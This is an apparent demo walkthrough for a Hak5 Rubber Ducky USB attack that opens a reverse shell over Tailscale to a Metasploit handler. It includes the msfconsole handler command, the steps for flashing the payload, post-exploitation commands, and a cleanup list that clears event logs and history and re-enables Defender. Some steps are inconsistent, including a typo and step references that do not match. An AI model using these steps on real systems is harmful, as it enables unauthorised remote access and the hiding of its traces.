# 🦆 Hak5 Rubber Ducky - Reverse Shell Demo
### Complete Walkthrough Guide

---

## ⚠️ Legal Disclaimer

```
This guide is for EDUCATIONAL PURPOSES ONLY.
Only perform these techniques on systems you own
or have explicit written permission to test.
Unauthorized access is illegal
```

---

## 📋 Table of Contents

1. [Overview](#overview)
2. [Requirements](#requirements)
3. [Architecture](#architecture)
4. [Setup](#setup)
5. [Demo](#demo)
6. [Cleanup](#cleanup)
7. [References](#references)

---

## 🎯 Overview

This is an educational demonstration of a HID (Human Interface Device) attack using a Hak5 Rubber Ducky to establish a reverse shell connection through Tailscale VPN to a Raspberry Pi listener.

```
⚠️  FOR EDUCATIONAL PURPOSES ONLY
⚠️  Only use on machines you own
⚠️  Unauthorized access is illegal
```

---

## 📦 Requirements

### Hardware
```
□ Hak5 Rubber Ducky
□ Kali Linux (your own machine)
□ Windows 10 Pro (target - your own machine)
```

### Software
```
□ Tailscale account (tailscale.com)
□ Metasploit Framework
□ Hak5 Payload Studio (https://payloadstudio.hak5.org/login/)
```

### Accounts Needed
```
□ Tailscale account
□ Hak5 account (for Payload Studio)
```

---

## 🏗️ Architecture

```
┌──────────────────────────────────────────┐
│           ATTACK FLOW                    │
├──────────────────────────────────────────┤
│                                          │     
│      Kali (listener)                     │
│       │                                  │
│       │ Tailscale VPN tunnel             │
│       ▼                                  │
│  Tailscale Network (100.x.x.x)           │
│       │                                  │
│       │ Reverse shell                    │
│       ▼                                  │
│  Windows Machine (victim)                │
│       │                                  │
│  USB Rubber Ducky plugged in             │
│                                          │
└──────────────────────────────────────────┘
```

---

## ⚙️ Setup

### Part 1 — Raspberry Pi Setup

#### 1.1 Install Tailscale
```bash
curl -fsSL https://tailscale.com/install.sh | sh
sudo systemctl enable tailscaled
sudo systemctl start taiscaled
sudo systemctl status tailscaled
sudo tailscale up
```

Authenticate via browser URL provided in terminal output.

#### 1.2 Get Pi Tailscale IP
```bash
tailscale ip -4
# Note this IP e.g 100.x.x.x
```

#### 1.3 Configure UFW Firewall
```bash
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow in on tailscale0 to any port 7889
sudo ufw enable
```

#### 1.4 Console Metasploit

```bash

msfconsole -q -x "
use exploit/multi/handler;
set payload windows/x64/shell_reverse_tcp;
set LHOST 0.0.0.0;
set LPORT 7889;
set ExitOnSession false;
run"
```

---


### Part 2 — Tailscale Auth Key

#### 2.1 Generate Reusable Auth Key
```
1. Go to login.tailscale.com
2. Settings → Keys
3. Generate Auth Key
4. Enable:
   ✅ Reusable
   ✅ Ephemeral
   ✅ Pre-authorized
5. Set expiry → 90 days
6. Copy key → tskey-auth-xxxxxxxxxx
```

> ⚠️ Rotate this key after every demo for security!

---

### Part 3 — Rubber Ducky Payload

#### 3.1 Replace These Values in -> (inject.txt)


| Placeholder         | Replace With                          |
|---------------------|---------------------------------------|
| `<YOUR_AUTHKEY>`    | Tailscale auth key from Step 3.1      |
| `<PI_TAILSCALE_IP>` | Pi Tailscale IP from Step 1.3         |

#### 3.2 Flash to Ducky

```
1. Go to payloadstudio.hak5.org
2. Paste payload into editor
3. Click Export → downloads inject.bin
4. Copy inject.bin to ROOT of Ducky SD card
5. Safely eject SD card
6. Insert SD card back into Ducky
```

> ✅ File must be named exactly: inject.bin
> ✅ Must be in ROOT of SD card, not in any folder

---

## 🎬 Demo

### Before Demo Checklist
```
□ Ducky SD card flashed with inject.bin
□ Tailscale auth key not expired
```

### Running the Demo

#### Step 1 — Start Listener on Pi
```bash
[*] Starting Metasploit...
[*] Started reverse TCP handler on 0.0.0.0:7889
```

#### Step 2 — Plug in Ducky
```
Insert Rubber Ducky into Windows machine
Wait approximately 20-30 seconds
Watch Metasploit on Kali for incoming connection
```

#### Step 3 — Session Opens
```
[*] Started reverse TCP handler on 0.0.0.0:7889
[*] Command shell session 1 opened ✅
```

#### Step 4 — Demo Commands
```bash
# Show system info
whoami
hostname
systeminfo | findstr "OS"

# Show network
ipconfig

# Fun demo - Rickroll audience 🎵
start https://www.youtube.com/watch?v=dQw4w9WgXcQ

```

#### Step 5 — Exit Session
```bash
# Exit shell
exit

```

---

## 🧹 Cleanup
### Cleanup Checklist
```
□ PowerShell processes killed
□ Tailscale logged out and uninstalled
□ PowerShell history cleared
□ Event logs cleared
□ Defender re-enabled
□ Windows removed from Tailscale dashboard
□ Auth key revoked
□ No connections on port 7889
```
---

### MITRE ATT&CK Mapping
```
T1091  - Replication through removable media (USB Ducky)
T1059  - Command and scripting interpreter (PowerShell)
T1053  - Scheduled task persistence
T1572  - Protocol tunneling (Tailscale VPN)
T1204  - User execution via USB
T1562  - Impair defenses (Defender disabled)
```

---

## 📚 References

```
Hak5 Rubber Ducky  → hak5.org/rubber-ducky
Tailscale          → tailscale.com
Metasploit         → metasploit.com
Payload Studio     → payloadstudio.hak5.org
MITRE ATT&CK       → attack.mitre.org
```

---

*Created for Hak5 Demo Event — Educational Purposes Only*